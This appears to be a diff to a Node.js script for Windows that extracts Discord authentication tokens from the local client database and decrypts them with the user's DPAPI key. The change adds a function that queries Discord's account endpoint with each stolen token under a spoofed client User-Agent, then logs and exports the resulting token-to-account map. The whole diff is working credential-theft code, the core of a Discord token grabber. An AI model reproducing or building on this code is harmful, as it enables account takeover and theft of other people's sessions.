@@ -1,6 +1,7 @@
 const fs = require('fs')
 const crypto = require('crypto')
 const path = require('path')
+const fetch = require('node-fetch')
 const dpapi = require('win-dpapi')
 
 if (process.platform !== 'win32') throw new Error('This only works on Windows')
@@ -45,7 +46,17 @@ async function decryptToken(token, decryptionKey) {
   return token
 }
 
-const setup = async () => {
+function getUserData(token) {
+  return fetch(`https://discordapp.com/api/v6/users/@me`, {
+    headers: {
+      Authorization: token,
+      'User-Agent':
+        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9005 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36'
+    }
+  }).then(res => res.json())
+}
+
+const run = async () => {
   const extractedTokens = await extractTokensFromDiscordDb()
   const decryptionKey = await getDecryptionKey()
 
@@ -54,12 +65,18 @@ const setup = async () => {
     // TODO: Support unencrypted tokens
     const isEncrypted = true
     if (isEncrypted) {
-      const decrypted = await decryptToken(extractedToken, decryptionKey)
-      tokens.add(decrypted)
+      const token = await decryptToken(extractedToken, decryptionKey)
+      tokens.add(token)
     }
   }
-  // TODO: call https://discord.com/api/v9/users/@me
   console.log(tokens)
+
+  const output = {}
+  for (const token of tokens) {
+    output[token] = await getUserData(token)
+  }
+  console.log(output)
+  return output
 }
 
-setup()
+module.exports = { run }
